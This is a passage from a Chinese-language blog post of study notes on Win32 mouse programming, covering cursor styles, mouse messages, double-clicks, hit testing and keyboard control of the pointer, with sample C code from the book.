      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/windows%20SDK%20chapter%207%20mouse/" class="post-title-link" itemprop="url">win32程序设计-chapter7 鼠标</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-17 10:19:00" itemprop="dateCreated datePublished" datetime="2022-08-17T10:19:00+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-18 10:19:51" itemprop="dateModified" datetime="2022-08-18T10:19:51+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-sdk-chapter-7-mouse">windows SDK chapter 7 mouse</h1>
<h2 id="鼠标的基本信息">鼠标的基本信息</h2>
<h3 id="是否在线">是否在线</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fMouse=GetSystemMetrics(SM_MOUSEPRESENT);</span><br></pre></td></tr></table></figure>
<p>如果鼠标都不在线(和鼠标共用接口的输入设备也有可能被作为鼠标),则该函数返回0.</p>
<p>如果至少有一个鼠标在线则函数返回非零值</p>
<h3 id="单键双键">单键双键</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cButtons = GetSystemMetrics(SM_CMOUSEBUTTONS);</span><br></pre></td></tr></table></figure>
<p>但是在我的笔记本电脑上,这个值是8,而我的鼠标就四个键</p>
<p>可能是触摸板加上了两指三指四指动作,等等各种使用方法?</p>
<h3 id="鼠标样式">鼠标样式</h3>
<p>鼠标样式最常见的就是斜向箭头,当程序忙的时候可能变成沙漏或者左箭头右沙漏</p>
<p>当绘图的时候鼠标可能会变成十字</p>
<p>实际上这个图标就是一个小的位图结构,点击鼠标时有效的位置只有一个像素点,叫做"焦点"</p>
<p>斜向箭头的焦点在顶点上.十字的焦点在十字路口</p>
<p>设置鼠标样式</p>
<p>在实例化窗口对象的时候就指定过一次鼠标样式了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wndclass.hCursor  = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br></pre></td></tr></table></figure>
<p>IDC_ARROW就是最常见的斜向箭头样式</p>
<table>
<colgroup>
<col style="width: 40%" />
<col style="width: 59%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td
style="text-align: left;"><strong>IDC_APPSTARTING</strong>MAKEINTRESOURCE(32650)</td>
<td style="text-align: left;">Standard arrow and small hourglass</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_ARROW</strong>MAKEINTRESOURCE(32512)</td>
<td style="text-align: left;">Standard arrow</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_CROSS</strong>MAKEINTRESOURCE(32515)</td>
<td style="text-align: left;">Crosshair</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_HAND</strong>MAKEINTRESOURCE(32649)</td>
<td style="text-align: left;">Hand</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_HELP</strong>MAKEINTRESOURCE(32651)</td>
<td style="text-align: left;">Arrow and question mark</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_IBEAM</strong>MAKEINTRESOURCE(32513)</td>
<td style="text-align: left;">I-beam</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_ICON</strong>MAKEINTRESOURCE(32641)</td>
<td style="text-align: left;">Obsolete for applications marked version
4.0 or later.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_NO</strong>MAKEINTRESOURCE(32648)</td>
<td style="text-align: left;">Slashed circle</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZE</strong>MAKEINTRESOURCE(32640)</td>
<td style="text-align: left;">Obsolete for applications marked version
4.0 or later. Use <strong>IDC_SIZEALL</strong>.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZEALL</strong>MAKEINTRESOURCE(32646)</td>
<td style="text-align: left;">Four-pointed arrow pointing north, south,
east, and west</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZENESW</strong>MAKEINTRESOURCE(32643)</td>
<td style="text-align: left;">Double-pointed arrow pointing northeast
and southwest</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZENS</strong>MAKEINTRESOURCE(32645)</td>
<td style="text-align: left;">Double-pointed arrow pointing north and
south</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZENWSE</strong>MAKEINTRESOURCE(32642)</td>
<td style="text-align: left;">Double-pointed arrow pointing northwest
and southeast</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_SIZEWE</strong>MAKEINTRESOURCE(32644)</td>
<td style="text-align: left;">Double-pointed arrow pointing west and
east</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_UPARROW</strong>MAKEINTRESOURCE(32516)</td>
<td style="text-align: left;">Vertical arrow</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IDC_WAIT</strong>MAKEINTRESOURCE(32514)</td>
<td style="text-align: left;">Hourglass</td>
</tr>
</tbody>
</table>
<p>然而在我的win11笔记本上,除了斜向箭头和转圈,其他鼠标样式都加载不出来,或者都加载成转圈或者斜向箭头</p>
<h2 id="客户区鼠标消息">客户区鼠标消息</h2>
<p>windows只把键盘消息发往具有输入焦点的窗口,但是鼠标不同</p>
<p>只要鼠标经过某个窗口,windows就会对齐发送一个WM_MOUSEMOVE的消息</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220813092214535.png"
alt="image-20220813092214535" />
<figcaption aria-hidden="true">image-20220813092214535</figcaption>
</figure>
<p>其中双击信息许哟啊在创建窗口实例的时候指明风格使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wndclass.style=CS_DBLCLKS | ...</span><br></pre></td></tr></table></figure>
<p>带有CS_DBLCLKS风格的窗口才可以接收WM_LBUTTONDBLCLK这种双击消息</p>
<p>对于鼠标消息(hwnd,message,wParam,lParam)</p>
<h3 id="lparam">lParam</h3>
<p>包含鼠标的位置信息,低字表示x坐标,高字表示y坐标</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=LOWORD(lParam);</span><br><span class="line">y=HIWORD(lParam);</span><br></pre></td></tr></table></figure>
<h3 id="wparam">wParam</h3>
<h3
id="包含了鼠标哪个键还有此时ctrl和shift的状态.">包含了鼠标哪个键,还有此时Ctrl和Shift的状态.</h3>
<p>令wParam和宏定义按位与即可测试相应状态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NOKEYSTATES</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_LBUTTON 0x0001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_RBUTTON 0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_SHIFT 0x0004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_CONTROL 0x0008</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_MBUTTON 0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_XBUTTON1 0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MK_XBUTTON2 0x0040</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="mousemove的速度">MOUSEMOVE的速度</h2>
<p>windows不会给鼠标经过的每个像素点都产生一个WM_MOUSEMOVE消息,这取决于应用程序处理WM_MOUSEMOVE的速度,当应用程序的消息队列中还有WM_MOUSEMOVE的消息时就不能接收第二个WM_MOUSEMOVE消息</p>
<p>书上在此给出了一个例子.</p>
<p>凡是WM_MOUSEMOVE捕获的点都会被计入点集,点集中任意两个点连一条线</p>
<p>分析一下其过程函数WndProc</p>
<h3 id="变量定义">变量定义</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> POINT pt[MAXPOINTS];<span class="comment">//存储已经捕获的点集</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> iCount;<span class="comment">//记录已经捕获的点数量</span></span><br><span class="line">HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line"><span class="type">int</span> i, j;<span class="comment">//循环变量</span></span><br><span class="line">PAINTSTRUCT ps;<span class="comment">//绘图结构</span></span><br></pre></td></tr></table></figure>
<h3 id="鼠标信息处理">鼠标信息处理</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">	iCount = <span class="number">0</span>;<span class="comment">//左键按下时清零重新记录</span></span><br><span class="line">	InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//清零后重绘</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_MOUSEMOVE:</span><br><span class="line">	<span class="keyword">if</span> (wParam &amp; MK_LBUTTON &amp;&amp; iCount &lt; MAXPOINTS)<span class="comment">//如果是左键按下的移动状态并且目前点集未满则捕获新点</span></span><br><span class="line">	&#123;</span><br><span class="line">		pt[iCount].x = LOWORD(lParam);<span class="comment">//捕获新点</span></span><br><span class="line">		pt[iCount++].y = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		SetPixel(hdc, LOWORD(lParam), HIWORD(lParam), <span class="number">0</span>);<span class="comment">//将该新点的位置打印成一个黑点</span></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONUP:</span><br><span class="line">	InvalidateRect(hwnd, <span class="literal">NULL</span>, FALSE);<span class="comment">//左键松开,立刻通知处理WM_PAINT函数,重绘点集</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="绘图消息">绘图消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">	hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">	SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_WAIT));<span class="comment">//由于绘图可能时间较长,因此此时将光标样式换成等待</span></span><br><span class="line">	ShowCursor(TRUE);<span class="comment">//显示光标</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; iCount - <span class="number">1</span>; i++)<span class="comment">//每两个点之间握手一次</span></span><br><span class="line">		<span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; iCount; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			MoveToEx(hdc, pt[i].x, pt[i].y, <span class="literal">NULL</span>);<span class="comment">//从pt[i]到pt[j]连线</span></span><br><span class="line">			LineTo(hdc, pt[j].x, pt[j].y);</span><br><span class="line">		&#125;</span><br><span class="line">	ShowCursor(FALSE);</span><br><span class="line">	SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_ARROW));<span class="comment">//绘图完毕,光标从忙状态换成指针状态</span></span><br><span class="line">	EndPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="窗口销毁消息">窗口销毁消息</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="效果">效果</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220813102524348.png"
alt="左鼠标移速快,右鼠标移速慢" />
<figcaption aria-hidden="true">左鼠标移速快,右鼠标移速慢</figcaption>
</figure>
<h2 id="双击">双击</h2>
<p>只有创建窗口实例时,风格上允许双击的窗口才可以接受双击信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于没有双击风格的窗口,双击动作造成的消息:</p>
<p>WM_LBUTTONDOWN 左键第一次按下</p>
<p>WM_LBUTTONUP 左键第一次起来</p>
<p>WM_LBUTTONDOWN 左键第二次按下</p>
<p>WM_LBUTTONUP 左键起来</p>
<p>对于有双击风格的窗口,双击造成的信息:</p>
<p>WM_LBUTTONDOWN</p>
<p>WM_LBUTTONUP</p>
<p>WM_LBUTTONDBLCLK 第二次按下被替换为WM_LBUTTONDBLCLK</p>
<p>WM_LBUTTONUP</p>
</blockquote>
<h2 id="非客户区鼠标消息">非客户区鼠标消息</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220813105023942.png"
alt="image-20220813105023942" />
<figcaption aria-hidden="true">image-20220813105023942</figcaption>
</figure>
<p>非客户区的消息在WM_前缀之后又加了一个NC前缀(not client)</p>
<h3 id="参数意义">参数意义</h3>
<h4 id="lparam-1">lParam</h4>
<p>低字为x坐标,高字为y坐标,此处的坐标是相对于整个屏幕的坐标</p>
<p>而客户区的鼠标信息中lParam携带的坐标是相对于客户区左上角的坐标</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220813105412718.png"
alt="image-20220813105412718" />
<figcaption aria-hidden="true">image-20220813105412718</figcaption>
</figure>
<p>屏幕坐标和客户区坐标的互换:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ScreenToClient</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND    hWnd,</span></span><br><span class="line"><span class="params">       LPPOINT lpPoint</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">BOOL <span class="title function_">ClientToScreen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HWND    hWnd,</span></span><br><span class="line"><span class="params">  [in, out] LPPOINT lpPoint</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>白刀子进,红刀子出</p>
</blockquote>
<p>使用pt带着原坐标进去,带着转换坐标出来</p>
<h4 id="wparam-1">wParam</h4>
<p>非客户区鼠标移动或者单击的位置(不是坐标),一个标识符</p>
<h2 id="击中测试">击中测试</h2>
<h3 id="wm_nchittest">WM_NCHITTEST</h3>
<p>关于鼠标的最后一个消息类型</p>
<p>这个消息优先级高于所有客户区和非客户区的鼠标消息</p>
<h4 id="lparam-2">lParam</h4>
<p>鼠标位置的屏幕坐标</p>
<h4 id="wparam-2">wParam</h4>
<p>没有用到</p>
<p>这条消息应该被直接传递给DefWindowProc,操作系统负责将屏幕坐标翻译为客户区坐标之后,产生一个客户区鼠标消息发送给应用程序</p>
<p>那么如果捕获该消息并且不让他传递给DefWindowProc,就阻断了所有鼠标消息.所有本窗口的鼠标动作将失效</p>
<h3 id="什么是击中测试">什么是击中测试</h3>
<p>在文件浏览器中双击某个文件时,文件浏览器会进入该目录或者打开该文件.</p>
<p>可是文件浏览器是怎么知道应该打开哪个文件的呢?</p>
<p>他需要获取鼠标位置然后判断这个位置落在哪里</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220814083834575.png"
alt="image-20220814083834575" />
<figcaption aria-hidden="true">image-20220814083834575</figcaption>
</figure>
<p>考虑实现一个简单的文件浏览器,以列表形式列出当前目录下的所有文件和子文件夹</p>
<p>每个文件占一行,放不下就用滚动条</p>
<p>客户区的点击动作就需要将纵坐标换算为行数,再根据卷动情况判断是指向的哪一行</p>
<p>根据确定的行号作为下标查文件名表,查到之后打开该文件,如果是文件夹则打开该文件夹</p>
<h3 id="击中测试例程">击中测试例程</h3>
<p>书上在此给出了一个击中测试的例程,分析其过程函数WndProc</p>
<h4 id="变量定义-1">变量定义</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DIVISIONS 5<span class="comment">//整个客户区分成5*5=25个矩形区域</span></span></span><br><span class="line">...</span><br><span class="line">	<span class="type">static</span> BOOL fState[DIVISIONS][DIVISIONS];<span class="comment">//状态数组,fState[x][y]记录第x行低y列的格子状态</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cxBlock, cyBlock;<span class="comment">//一个格子的宽度和高度</span></span><br><span class="line">    HDC hdc;</span><br><span class="line">    <span class="type">int</span> x, y;<span class="comment">//临时变量,作为下标遍历每个格子</span></span><br><span class="line">    PAINTSTRUCT ps;</span><br></pre></td></tr></table></figure>
<h4 id="尺寸变化消息">尺寸变化消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">    cxBlock = LOWORD(lParam) / DIVISIONS;<span class="comment">//lParam携带的是当前客户区大小,cxBlocks计算的是平均每个矩形的宽度</span></span><br><span class="line">    cyBlock = HIWORD(lParam) / DIVISIONS;<span class="comment">//平均每个矩形的高度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>尽量用整个客户区打印所有方格</p>
<h4 id="左键单击消息">左键单击消息</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">case WM_LBUTTONDOWN:</span><br><span class="line">    x = LOWORD(lParam) / cxBlock;//鼠标的横坐标落在哪一列</span><br><span class="line">    y = HIWORD(lParam) / cyBlock;//鼠标的纵坐标落在哪一行</span><br><span class="line">    if (x &lt; DIVISIONS &amp;&amp; y &lt; DIVISIONS) &#123;//x,y都在合法范围之内</span><br><span class="line">        fState[x][y] ^= 1;//修改fState[x][y]的状态,1变0,0变1</span><br><span class="line">        rect.left = x * cxBlock;</span><br><span class="line">        rect.top = y * cyBlock;</span><br><span class="line">        rect.right = (x + 1) * cxBlock;</span><br><span class="line">        rect.bottom = (y + 1) * cyBlock;</span><br><span class="line">        //InvalidateRect(hwnd, &amp;rect, TRUE);//rect对应区域失效</span><br><span class="line">        InvalidateRect(hwnd, NULL, TRUE);//全区域失效重绘</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else &#123;</span><br><span class="line">        MessageBeep(0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br></pre></td></tr></table></figure>
<h4 id="绘图消息-1">绘图消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">    hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">    <span class="comment">//HBRUSH hBrushBlack=(HBRUSH)</span></span><br><span class="line">    <span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; DIVISIONS; ++x) &#123;<span class="comment">//遍历每个矩形区域</span></span><br><span class="line">        <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; DIVISIONS; ++y) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fState[x][y]) &#123;<span class="comment">//1则表示这个格子是按下的状态,刷成灰色</span></span><br><span class="line">                SelectObject(hdc, (HBRUSH)GetStockObject(LTGRAY_BRUSH));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;<span class="comment">//0则表示这个格子没有按下,刷成白色</span></span><br><span class="line">                SelectObject(hdc, (HBRUSH)GetStockObject(WHITE_BRUSH));</span><br><span class="line">            &#125;</span><br><span class="line">            Rectangle(hdc, x * cxBlock, y * cyBlock, (x + <span class="number">1</span>) * cxBlock, (y + <span class="number">1</span>) * cyBlock);<span class="comment">//每个区域绘制矩形</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    EndPaint(hwnd, &amp;ps);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="键盘模仿鼠标">键盘模仿鼠标</h2>
<p>使用方向键移动鼠标光标.使用Enter确认按下</p>
<p>这样即使计算机没有连接鼠标也能使用键盘模拟鼠标动作</p>
<p>比如windows桌面上如果有一个图标是高亮的,那么右方向键会使同行右侧的图标高亮,可以用隐藏光标,然后捕获位置进行击中测试,决定高亮哪个图标.</p>
<h3 id="显示计数">显示计数</h3>
<p>书上扯了大半天,实际上就说了一个有用的东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ShowCursor</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] BOOL bShow</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>当bShow为False则不显示鼠标光标</p>
<p>当bShow为True则显示鼠标光标</p>
<h3 id="指针位置">指针位置</h3>
<p>不管有没有接鼠标,鼠标指针都是存在的,一般开机时位于屏幕正中间.即使不使用鼠标移动指针位置,也可以使用键盘做到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">GetCursorPos</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out] LPPOINT lpPoint<span class="comment">//lpPoint承接返回值,指针位置的坐标结构体</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">BOOL <span class="title function_">SetCursorPos</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> X,<span class="comment">//设置指针位置(X,Y)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> Y</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>两个函数中涉及到的坐标都是屏幕坐标,如果需要客户区坐标,可以使用坐标转换函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ScreenToClient</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND    hWnd,</span></span><br><span class="line"><span class="params">       LPPOINT lpPoint</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">BOOL <span class="title function_">ClientToScreen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HWND    hWnd,</span></span><br><span class="line"><span class="params">  [in, out] LPPOINT lpPoint</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>使用GetCursorPos并且用ScreenToClient转换得到的指针位置和鼠标消息中的指针位置不同</p>
<p>前者是啥时候调用函数啥时候取得指针位置,后者指针位置是产生该条消息时指针的位置</p>
<h3 id="击中测试-1">击中测试</h3>
<h4 id="变量定义-2">变量定义</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DIVISIONS 5<span class="comment">//客户区划分为5*5=25个区域</span></span></span><br><span class="line">...</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> fState[DIVISIONS][DIVISIONS];<span class="comment">//记录每个格子的状态</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cxBlock, cyBlock;<span class="comment">//每个格子的宽度和高度</span></span><br><span class="line">    HDC hdc;</span><br><span class="line">    <span class="type">int</span> x, y;<span class="comment">//临时变量,用来遍历fState</span></span><br><span class="line">    PAINTSTRUCT ps;<span class="comment">//BeginPaint和EndPaint需要使用</span></span><br><span class="line">    POINT point;记录鼠标位置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="窗口焦点信息">窗口焦点信息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SETFOCUS:<span class="comment">//获得焦点</span></span><br><span class="line">    ShowCursor(TRUE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> WM_KILLFOCUS:<span class="comment">//失去焦点</span></span><br><span class="line">    ShowCursor(FALSE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>当窗口获得焦点的时候显示光标,失去焦点的时候隐藏光标</p>
<h4 id="尺寸调整信息">尺寸调整信息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:<span class="comment">//客户区重新计算块大小</span></span><br><span class="line">    cxBlock = LOWORD(lParam) / DIVISIONS;</span><br><span class="line">    cyBlock = HIWORD(lParam) / DIVISIONS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>当客户区尺寸发生变化的时候调整区块的大小</p>
<p>使得5*5个区块尽量占满整个客户区</p>
<h4 id="虚拟键信息">虚拟键信息</h4>
